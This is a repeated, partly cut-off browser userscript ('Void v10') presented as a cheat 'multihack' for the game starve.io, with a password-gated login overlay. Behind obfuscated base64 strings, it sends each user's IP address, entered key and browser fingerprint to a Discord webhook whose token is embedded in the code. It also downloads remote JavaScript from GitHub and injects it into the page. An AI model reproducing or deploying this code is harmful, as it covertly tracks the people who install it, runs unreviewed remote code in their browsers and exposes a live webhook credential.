                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
